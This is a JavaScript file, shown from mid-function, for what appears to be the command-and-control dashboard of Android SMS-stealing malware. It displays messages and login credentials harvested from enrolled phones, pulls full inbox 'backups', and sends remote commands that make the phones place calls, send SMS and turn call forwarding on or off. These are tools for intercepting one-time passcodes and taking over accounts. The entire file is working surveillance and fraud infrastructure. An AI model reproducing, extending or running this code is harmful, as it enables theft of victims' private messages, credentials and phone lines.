        state.allSmsList = [];
        const smsData = state.data.user_sms || {};
        Object.keys(smsData).forEach(devId => {
            if (state.smsFilterDevice && state.smsFilterDevice !== devId) return;
            const msgs = smsData[devId];
            Object.keys(msgs).forEach(k => {
                state.allSmsList.push({ deviceId: devId, ...msgs[k] });
            });
        });
        state.allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        
        const countEl = $('panelSmsCount');
        if (countEl) {
            countEl.textContent = state.smsFilterDevice ? state.allSmsList.length + ' (filtered)' : state.allSmsList.length;
        }
    }
    
    if (state.allSmsList.length === 0) {
        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>${state.smsFilterDevice ? 'No messages for ' + escapeHtml(state.smsFilterDevice) : 'No messages found'}</div>`;
        if (loadMore) loadMore.style.display = 'none';
        return;
    }
    
    const start = state.allSmsOffset;
    const end = Math.min(start + SMS_LIMIT, state.allSmsList.length);
    const paginated = state.allSmsList.slice(start, end);
    
    const newHtml = renderSmsCards(paginated, true);
    
    if (state.allSmsOffset === 0) {
        container.innerHTML = newHtml;
    } else {
        container.innerHTML += newHtml;
    }
    
    if (loadMore) {
        if (end < state.allSmsList.length) {
            loadMore.style.display = 'block';
            loadMore.textContent = `📥 Load More (${state.allSmsList.length - end} remaining)`;
        } else {
            loadMore.style.display = 'none';
        }
    }
}

// ============================================================
// FILTER SMS BY DEVICE
// ============================================================
function filterSmsByDevice(deviceId) {
    state.smsFilterDevice = deviceId;
    const clearBtn = $('clearSmsFilterBtn');
    if (clearBtn) clearBtn.style.display = 'inline-block';
    state.allSmsOffset = 0;
    showToast(`📱 Filtering: ${deviceId}`, 'info');
    
    if (!state.isPanelOpen.sms) {
        togglePanel('sms');
    } else {
        renderAllSmsOptimized();
    }
}

function clearSmsFilter() {
    state.smsFilterDevice = null;
    const clearBtn = $('clearSmsFilterBtn');
    if (clearBtn) clearBtn.style.display = 'none';
    state.allSmsOffset = 0;
    renderAllSmsOptimized();
    showToast('✅ Filter cleared', 'success');
}

// ============================================================
// RENDER ANALYTICS
// ============================================================
function renderAnalytics() {
    const devices = state.data.user_data || {};
    const totalDevices = $('analyticsTotalDevices');
    if (totalDevices) totalDevices.textContent = Object.keys(devices).length;
    
    const smsData = state.data.user_sms || {};
    let totalSms = 0;
    Object.keys(smsData).forEach(d => totalSms += Object.keys(smsData[d]).length);
    const totalSmsEl = $('analyticsTotalSms');
    if (totalSmsEl) totalSmsEl.textContent = totalSms;
    
    const backupData = state.data.backup_sms || {};
    let backupCount = 0;
    Object.keys(backupData).forEach(d => backupCount += Object.keys(backupData[d]).length);
    const backupSmsEl = $('analyticsBackupSms');
    if (backupSmsEl) backupSmsEl.textContent = backupCount;
    
    let latest = 0;
    Object.keys(smsData).forEach(d => {
        const msgs = smsData[d];
        Object.keys(msgs).forEach(k => {
            const ts = msgs[k].timestamp || 0;
            if (ts > latest) latest = ts;
        });
    });
    const lastActivityEl = $('analyticsLastActivity');
    if (lastActivityEl) {
        if (latest > 0) {
            const d = new Date(latest);
            lastActivityEl.textContent = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        } else {
            lastActivityEl.textContent = '—';
        }
    }
}

// ============================================================
// RENDER BACKUP PANEL
// ============================================================
function renderBackupPanel() {
    const select = $('backupDeviceSelect');
    if (!select) return;
    
    const devices = state.data.user_data || {};
    const keys = Object.keys(devices);
    const current = select.value;
    
    // Only update if changed
    const currentOptions = Array.from(select.options).map(o => o.value);
    const newOptions = ['', ...keys];
    
    if (JSON.stringify(currentOptions) !== JSON.stringify(newOptions)) {
        select.innerHTML = '<option value="">— Select a device —</option>';
        keys.forEach(id => {
            const dev = devices[id];
            const name = dev.d_name || dev.device_name || id;
            const serial = state.deviceSerialMap.get(id) || 0;
            const label = serial > 0 ? `#${serial} ${name}` : name;
            select.innerHTML += `<option value="${escapeHtml(id)}">${escapeHtml(label)}</option>`;
        });
        if (current && keys.includes(current)) select.value = current;
    }
    
    if (select.value) {
        updateBackupStatusDisplay(select.value);
        loadBackupSmsForDevice(select.value);
    }
}

// ============================================================
// BACKUP FUNCTIONS
// ============================================================
function updateBackupStatusDisplay(devId) {
    const dev = state.data.user_data?.[devId];
    if (!dev) {
        const statusEl = $('backupStatusValue');
        if (statusEl) {
            statusEl.textContent = 'Device not found';
            statusEl.className = 'status-value failed';
        }
        return;
    }
    
    const status = dev.backup_status || {};
    const info = dev.backup_info || {};
    
    const st = status.backup_status || 'No backup';
    const msg = status.backup_message || '';
    
    const statusEl = $('backupStatusValue');
    if (statusEl) {
        if (st === 'success') {
            statusEl.textContent = '✅ ' + (msg || 'Backup successful');
            statusEl.className = 'status-value success';
        } else if (st === 'in_progress' || st === 'pending') {
            statusEl.textContent = '⏳ ' + (msg || 'In progress...');
            statusEl.className = 'status-value pending';
        } else if (st === 'failed' || st === 'error') {
            statusEl.textContent = '❌ ' + (msg || 'Backup failed');
            statusEl.className = 'status-value failed';
        } else {
            statusEl.textContent = '📊 ' + (msg || 'No backup');
            statusEl.className = 'status-value';
        }
    }
    
    const last = info.last_backup_time || info.timestamp || null;
    const lastTimeEl = $('backupLastTime');
    if (lastTimeEl) {
        lastTimeEl.textContent = last ? new Date(last).toLocaleString() : 'Never';
    }
    
    const count = info.latest_backup_count || info.sms_count || 0;
    const smsCountEl = $('backupSmsCount');
    if (smsCountEl) smsCountEl.textContent = count + ' SMS';
    
    const backupIdEl = $('backupId');
    if (backupIdEl) backupIdEl.textContent = info.backup_id || status.backup_id || 'N/A';
    
    const badge = $('backupStatusBadge');
    if (badge) badge.textContent = st === 'success' ? '✅ Ready' : '⏳ Pending';
}

function triggerBackup() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    triggerDeviceBackup(devId);
}

function triggerDeviceBackup(devId) {
    if (!devId) return;
    const statusEl = $('backupStatusValue');
    if (statusEl) {
        statusEl.textContent = '⏳ Sending...';
        statusEl.className = 'status-value pending';
    }
    
    db.ref(`user_data/${devId}`).update({
        device: devId,
        command: 'backup',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Backup command sent to ${devId}`, 'success');
        setTimeout(refreshBackupStatus, 3000);
    }).catch(() => {
        if (statusEl) {
            statusEl.textContent = '❌ Failed';
            statusEl.className = 'status-value failed';
        }
        showToast('❌ Failed to send', 'error');
    });
}

function refreshBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    
    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        if (snap.exists()) {
            if (!state.data.user_data) state.data.user_data = {};
            if (!state.data.user_data[devId]) state.data.user_data[devId] = {};
            state.data.user_data[devId].backup_status = snap.val();
        }
        updateBackupStatusDisplay(devId);
        loadBackupSmsForDevice(devId);
        showToast('✅ Status refreshed', 'success');
    }).catch(() => showToast('❌ Failed', 'error'));
}

function refreshDeviceBackup(devId) {
    const div = document.getElementById(`deviceBackup-${devId}`);
    if (!div) return;
    div.innerHTML = '⏳ Checking...';
    
    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        let html = '';
        if (snap.exists()) {
            const data = snap.val();
            const st = data.backup_status || 'Unknown';
            const msg = data.backup_message || '';
            let color = 'var(--text-muted)';
            let icon = '📊';
            if (st === 'success') { color = 'var(--green)'; icon = '✅'; }
            else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b'; icon = '⏳'; }
            else if (st === 'failed' || st === 'error') { color = 'var(--red)'; icon = '❌'; }
            html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;
            
            db.ref(`user_data/${devId}/backup_info`).once('value').then(infoSnap => {
                if (infoSnap.exists()) {
                    const info = infoSnap.val();
                    const count = info.latest_backup_count || info.sms_count || 0;
                    const last = info.last_backup_time || info.timestamp || null;
                    html += `<div style="font-size:10px;color:var(--text-muted);margin-top:3px;">📨 ${count} SMS | ${last ? '📅 ' + new Date(last).toLocaleString() : 'No time'}</div>`;
                }
                div.innerHTML = html;
            });
        } else {
            div.innerHTML = '📊 No backup status';
        }
    }).catch(() => {
        div.innerHTML = '❌ Error loading';
    });
}

function clearBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    if (!confirm(`Clear backup status for ${devId}?`)) return;
    
    db.ref(`user_data/${devId}/backup_status`).remove().then(() => {
        db.ref(`user_data/${devId}/backup_info`).remove().then(() => {
            showToast(`✅ Cleared for ${devId}`, 'success');
            updateBackupStatusDisplay(devId);
            loadBackupSmsForDevice(devId);
        });
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// LOAD BACKUP SMS FOR DEVICE
// ============================================================
function loadBackupSmsForDevice(devId) {
    const container = $('backupSmsList');
    if (!devId) {
        if (container) container.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
        return;
    }
    
    const backupData = state.data.backup_sms;
    if (backupData && backupData[devId]) {
        renderBackupSmsList(container, backupData[devId]);
        return;
    }
    
    if (container) {
        container.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading...</div>';
    }
    
    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
        if (snap.exists()) {
            renderBackupSmsList(container, snap.val());
        } else {
            if (container) container.innerHTML = '<div class="empty-luxury">No backup SMS found</div>';
        }
    }).catch(() => {
        if (container) container.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
    });
}

function renderBackupSmsList(container, data) {
    if (!container) return;
    const messages = [];
    Object.keys(data).forEach(key => {
        messages.push({ key, ...data[key] });
    });
    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    
    if (messages.length === 0) {
        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
        return;
    }
    
    container.innerHTML = messages.map(msg => `
        <div class="backup-sms-item">
            <div class="sms-header">
                <span class="sender">👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}</span>
                <span>${escapeHtml(msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString())}</span>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
                ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
                ${msg.backup_id ? ' • 💾 ' + escapeHtml(msg.backup_id) : ''}
            </div>
        </div>
    `).join('');
}

// ============================================================
// OPEN BACKUP SMS MODAL
// ============================================================
function openBackupSmsModal() {
    const modal = $('backupSmsModal');
    const body = $('backupModalBody');
    const title = $('backupModalTitle');
    
    if (title) title.textContent = '💾 All Backup Messages';
    if (body) body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
    if (modal) modal.classList.add('open');
    
    const backupData = state.data.backup_sms;
    if (backupData) {
        renderAllBackupSms(body, backupData);
        return;
    }
    
    db.ref('backup_sms').once('value').then(snap => {
        if (snap.exists()) {
            renderAllBackupSms(body, snap.val());
        } else {
            if (body) body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>No backup messages</div>';
        }
    }).catch(() => {
        if (body) body.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
    });
}

function renderAllBackupSms(container, data) {
    if (!container) return;
    let allMsgs = [];
    Object.keys(data).forEach(devId => {
        const devMsgs = data[devId];
        Object.keys(devMsgs).forEach(key => {
            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
        });
    });
    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    
    if (allMsgs.length === 0) {
        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
        return;
    }
    
    container.innerHTML = allMsgs.map(msg => `
        <div class="backup-sms-item">
            <div class="sms-header">
                <span class="sender">
                    <span style="color:var(--gold-light);font-size:10px;">[${escapeHtml(msg.deviceId)}]</span>
                    👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
                </span>
                <span>${escapeHtml(msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString())}</span>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
                ${msg.sim_number ? '📱 ' + escapeHtml(msg.sim_number) : ''}
                ${msg.backup_id ? ' • 💾 ' + escapeHtml(msg.backup_id) : ''}
            </div>
        </div>
    `).join('');
}

function closeBackupSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    const modal = $('backupSmsModal');
    if (modal) modal.classList.remove('open');
}

// ============================================================
// MODAL FUNCTIONS
// ============================================================
function openSmsModal(target) {
    state.modalTarget = target;
    state.modalSmsOffset = 0;
    state.modalSmsList = [];
    
    const smsData = state.data.user_sms || {};
    if (target === 'ALL') {
        const title = $('modalTitle');
        if (title) title.textContent = '📩 All Messages';
        Object.keys(smsData).forEach(devId => {
            const msgs = smsData[devId];
            Object.keys(msgs).forEach(k => {
                state.modalSmsList.push({ deviceId: devId, ...msgs[k] });
            });
        });
    } else {
        const title = $('modalTitle');
        if (title) title.textContent = `📩 Messages for ${target}`;
        if (smsData[target]) {
            Object.keys(smsData[target]).forEach(k => {
                state.modalSmsList.push(smsData[target][k]);
            });
        }
    }
    
    state.modalSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    renderModalSms();
    const modal = $('smsModal');
    if (modal) modal.classList.add('open');
}

function renderModalSms() {
    const body = $('modalBody');
    const loadMore = $('modalLoadMore');
    if (!body) return;
    
    const start = state.modalSmsOffset;
    const end = Math.min(start + SMS_LIMIT, state.modalSmsList.length);
    const paginated = state.modalSmsList.slice(start, end);
    
    const newHtml = renderSmsCards(paginated, state.modalTarget === 'ALL');
    
    if (state.modalSmsOffset === 0) {
        body.innerHTML = newHtml;
    } else {
        body.innerHTML += newHtml;
    }
    
    if (loadMore) {
        if (end < state.modalSmsList.length) {
            loadMore.style.display = 'block';
            loadMore.textContent = `📥 Load More (${state.modalSmsList.length - end} remaining)`;
        } else {
            loadMore.style.display = 'none';
        }
    }
}

function closeSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    const modal = $('smsModal');
    if (modal) modal.classList.remove('open');
}

// ============================================================
// SCROLL CREDENTIALS FUNCTIONS
// ============================================================
function scrollCredentialsToBottom(devId) {
    const container = document.getElementById(`login-cards-${devId}`);
    if (container) {
        container.scrollTo({
            top: container.scrollHeight,
            behavior: 'smooth'
        });
        showToast('📜 Scrolled to bottom', 'info', 1000);
    }
}

function scrollCredentialsToTop(devId) {
    const container = document.getElementById(`login-cards-${devId}`);
    if (container) {
        container.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
        showToast('📜 Scrolled to top', 'info', 1000);
    }
}

function autoScrollCredentials(devId) {
    setTimeout(() => {
        const container = document.getElementById(`login-cards-${devId}`);
        if (container && container.children.length > 5) {
            setTimeout(() => {
                container.scrollTo({
                    top: container.scrollHeight,
                    behavior: 'smooth'
                });
                setTimeout(() => {
                    container.scrollTo({
                        top: 0,
                        behavior: 'smooth'
                    });
                }, 600);
            }, 300);
        }
    }, 100);
}

// ============================================================
// COPY FIELD
// ============================================================
function copyField(fieldId) {
    const el = document.getElementById(fieldId);
    if (!el) return;
    const text = el.textContent;
    navigator.clipboard.writeText(text).then(() => {
        showToast('📋 Copied: ' + text.substring(0, 30) + (text.length > 30 ? '...' : ''), 'success');
        el.style.color = 'var(--gold)';
        setTimeout(() => el.style.color = '', 800);
    }).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast('📋 Copied!', 'success');
    });
}

// ============================================================
// DELETE FUNCTIONS
// ============================================================
function deleteAllCredentials() {
    const password = prompt('🔐 Enter Password to Delete ALL Credentials:');
    if (password === null) return;
    
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    
    if (!confirm('⚠️ Are you sure you want to DELETE ALL CREDENTIALS?')) {
        return;
    }
    
    const loginData = state.data.login || {};
    if (Object.keys(loginData).length === 0) {
        showToast('📭 No credentials to delete', 'info');
        return;
    }
    
    showToast('⏳ Deleting all credentials...', 'info');
    
    const promises = Object.keys(loginData).map(devId => 
        db.ref(`login/${devId}`).remove()
    );
    
    Promise.all(promises).then(() => {
        showToast('✅ All credentials deleted successfully!', 'success');
        scheduleRender();
    }).catch(err => {
        showToast('❌ Error: ' + err.message, 'error');
    });
}

function deleteDeviceCredentials(devId) {
    const password = prompt('🔐 Enter Password to Delete Credentials:');
    if (password === null) return;
    
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    
    if (!confirm(`⚠️ Delete all credentials for device ${devId}?`)) {
        return;
    }
    
    const loginData = state.data.login || {};
    if (!loginData[devId] || Object.keys(loginData[devId]).length === 0) {
        showToast('📭 No credentials for this device', 'info');
        return;
    }
    
    showToast(`⏳ Deleting credentials for ${devId}...`, 'info');
    
    db.ref(`login/${devId}`).remove().then(() => {
        showToast(`✅ Credentials deleted for ${devId}`, 'success');
        scheduleRender();
    }).catch(err => {
        showToast('❌ Error: ' + err.message, 'error');
    });
}

function deleteAllSms() {
    const password = prompt('🔐 Enter Password to Delete All SMS:');
    if (password === null) return;
    
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    
    if (!confirm('⚠️ Are you sure you want to DELETE ALL SMS?')) {
        return;
    }
    
    const smsData = state.data.user_sms || {};
    if (Object.keys(smsData).length === 0) {
        showToast('📭 No SMS to delete', 'info');
        return;
    }
    
    showToast('⏳ Deleting all SMS...', 'info');
    
    const promises = Object.keys(smsData).map(devId => 
        db.ref(`user_sms/${devId}`).remove()
    );
    
    Promise.all(promises).then(() => {
        showToast('✅ All SMS deleted successfully!', 'success');
        state.deviceSmsCache.clear();
        state.allSmsList = [];
        state.allSmsOffset = 0;
        scheduleRender();
    }).catch(err => {
        showToast('❌ Error: ' + err.message, 'error');
    });
}

function deleteDeviceSms(devId) {
    const password = prompt('🔐 Enter Password to Delete SMS:');
    if (password === null) return;
    
    if (password !== DELETE_PASSWORD) {
        showToast('❌ Incorrect Password!', 'error');
        return;
    }
    
    if (!confirm(`⚠️ Delete all SMS for device ${devId}?`)) {
        return;
    }
    
    const smsData = state.data.user_sms || {};
    if (!smsData[devId] || Object.keys(smsData[devId]).length === 0) {
        showToast('📭 No SMS for this device', 'info');
        return;
    }
    
    showToast(`⏳ Deleting SMS for ${devId}...`, 'info');
    
    db.ref(`user_sms/${devId}`).remove().then(() => {
        showToast(`✅ SMS deleted for ${devId}`, 'success');
        state.deviceSmsCache.delete(devId);
        state.allSmsList = [];
        state.allSmsOffset = 0;
        scheduleRender();
    }).catch(err => {
        showToast('❌ Error: ' + err.message, 'error');
    });
}

// ============================================================
// SHOW COMMAND DIALOG
// ============================================================
function showCommandDialog(type, devId) {
    const messages = {
        'call': '📞 Send CALL command to this device?',
        'sms': '✉️ Send SMS command to this device?',
        'fwd_on': '🔀 Activate CALL FORWARDING on this device?',
        'fwd_off': '🔀 Deactivate CALL FORWARDING on this device?',
        'backup': '💾 Trigger SMS BACKUP on this device?'
    };
    
    if (!confirm(messages[type] || 'Send command?')) return;
    
    switch (type) {
        case 'call': sendCall(devId); break;
        case 'sms': sendSms(devId); break;
        case 'fwd_on': sendFwd(devId, 'call forward'); break;
        case 'fwd_off': sendFwd(devId, 'forward off'); break;
        case 'backup': triggerDeviceBackup(devId); break;
    }
}

// ============================================================
// COMMAND FUNCTIONS
// ============================================================
function sendCall(devId) {
    const number = $(`callNum-${devId}`).value.trim();
    const simSlot = $(`callSim-${devId}`).value;
    if (!number) return showToast('Enter phone number!', 'warning');
    
    db.ref(`user_data/${devId}`).update({
        device: devId,
        simSlot: simSlot,
        adminNumber: number,
        command: 'make call',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Call sent to ${devId}`, 'success');
        $(`callNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendSms(devId) {
    const number = $(`smsNum-${devId}`).value.trim();
    const text = $(`smsText-${devId}`).value.trim();
    const simSlot = $(`smsSim-${devId}`).value;
    if (!number || !text) return showToast('Enter both number and message!', 'warning');
    
    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        phoneNumber: number,
        messageText: text,
        simSlot: simSlot,
        command: 'send message',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ SMS sent to ${devId}`, 'success');
        $(`smsNum-${devId}`).value = '';
        $(`smsText-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendFwd(devId, cmd) {
    const number = $(`fwdNum-${devId}`).value.trim();
    const simSlot = $(`fwdSim-${devId}`).value;
    if (cmd === 'call forward' && !number) return showToast('Enter forward number!', 'warning');
    
    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        simSlot: simSlot,
        phoneNumber: number || '',
        command: cmd,
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Forward (${cmd}) sent`, 'success');
        $(`fwdNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// TOAST
// ============================================================
function showToast(message, type = 'info', duration = 2800) {
    const container = $('toastContainer');
    if (!container) return;
    
    const toast = document.createElement('div');
    toast.className = `toast-luxury ${type}`;
    toast.textContent = message;
    container.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateY(-10px)';
        toast.style.transition = 'all 0.3s ease';
        setTimeout(() => {
            if (toast.parentNode) toast.remove();
        }, 300);
    }, duration);
}

// ============================================================
// ESCAPE HTML - SECURITY
// ============================================================
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ============================================================
// DOM CONTENT LOADED
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    // Backup select change
    const backupSelect = $('backupDeviceSelect');
    if (backupSelect) {
        backupSelect.addEventListener('change', function() {
            const id = this.value;
            if (id) {
                updateBackupStatusDisplay(id);
                loadBackupSmsForDevice(id);
                refreshDeviceBackup(id);
            } else {
                const list = $('backupSmsList');
                if (list) list.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
            }
        });
    }
    
    // Search
    const searchInput = $('deviceSearchInput');
    const clearBtn = $('searchClearBtn');
    if (searchInput) {
        searchInput.addEventListener('input', function() {
            const val = this.value;
            if (clearBtn) {
                clearBtn.style.display = val ? 'flex' : 'none';
            }
            searchDevices(val);
        });
    }
    
    if (clearBtn) {
        clearBtn.addEventListener('click', clearSearch);
    }
    
    // Initial render
    setTimeout(() => {
        performRender();
    }, 100);
});

// ============================================================
// GLOBAL EXPOSURE - For inline onclick handlers
// ============================================================
window.togglePanel = togglePanel;
window.toggleDevice = toggleDevice;
window.setTab = setTab;
window.searchDevices = searchDevices;
window.clearSearch = clearSearch;
window.filterDevices = filterDevices;
window.checkDeviceStatus = checkDeviceStatus;
window.loadMoreDevices = loadMoreDevices;
window.loadMoreDeviceSms = loadMoreDeviceSms;
window.loadMoreAllSms = loadMoreAllSms;
window.openSmsModal = openSmsModal;
window.closeSmsModal = closeSmsModal;
window.loadMoreModalSms = loadMoreModalSms;
window.copyField = copyField;
window.showCommandDialog = showCommandDialog;
window.deleteAllCredentials = deleteAllCredentials;
window.deleteDeviceCredentials = deleteDeviceCredentials;
window.deleteAllSms = deleteAllSms;
window.deleteDeviceSms = deleteDeviceSms;
window.filterSmsByDevice = filterSmsByDevice;
window.clearSmsFilter = clearSmsFilter;
window.triggerBackup = triggerBackup;
window.refreshBackupStatus = refreshBackupStatus;
window.clearBackupStatus = clearBackupStatus;
window.openBackupSmsModal = openBackupSmsModal;
window.closeBackupSmsModal = closeBackupSmsModal;
window.refreshDeviceBackup = refreshDeviceBackup;
window.scrollCredentialsToBottom = scrollCredentialsToBottom;
window.scrollCredentialsToTop = scrollCredentialsToTop;